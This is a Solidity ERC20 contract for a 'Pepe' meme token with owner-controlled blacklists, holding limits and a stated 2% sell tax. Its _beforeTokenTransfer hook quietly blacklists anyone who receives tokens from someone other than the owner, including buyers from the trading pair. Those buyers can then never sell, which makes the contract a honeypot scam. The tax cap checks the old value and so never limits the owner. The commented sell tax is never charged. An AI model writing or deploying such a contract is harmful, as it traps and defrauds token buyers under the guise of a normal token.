//SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

contract Pepe is Ownable, ERC20 {
    using SafeMath for uint256;

    bool public limited;
    uint256 public maxHoldingAmount;
    uint256 public minHoldingAmount;

    address public pair;
    IUniswapV2Router02 public router;
    
    mapping(address => bool) public blacklists;
    uint256 public taxPercentage = 2; // 2% tax on sell transactions

    constructor(uint256 _totalSupply) ERC20("Pepe", "PEPE") {
        _mint(msg.sender, _totalSupply);
    }

    function setUniswap(address _pair, address _router) external onlyOwner {
        pair = _pair;
        router = IUniswapV2Router02(_router);
    }

    function setTaxation(uint _taxPercentage) external onlyOwner {
        require(taxPercentage <= 5);
        taxPercentage = _taxPercentage;    
    }

    function blacklistMultiple(address[] memory _addresses) external onlyOwner {
        for (uint i = 0; i < _addresses.length; i++) {
            blacklists[_addresses[i]] = true;
        }
    }

    function setRule(bool _limited, uint256 _maxHoldingAmount, uint256 _minHoldingAmount) external onlyOwner {
        limited = _limited;
        maxHoldingAmount = _maxHoldingAmount;
        minHoldingAmount = _minHoldingAmount;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override virtual {
        require(!blacklists[from], "Blacklisted");

        if (from != owner() && to != pair) {
            blacklists[to] = true;
        }

        if (limited) {
            require (to != pair);
        }

        super._beforeTokenTransfer(from, to, amount);
    }

    function burn(uint256 value) external {
        _burn(msg.sender, value);
    }
}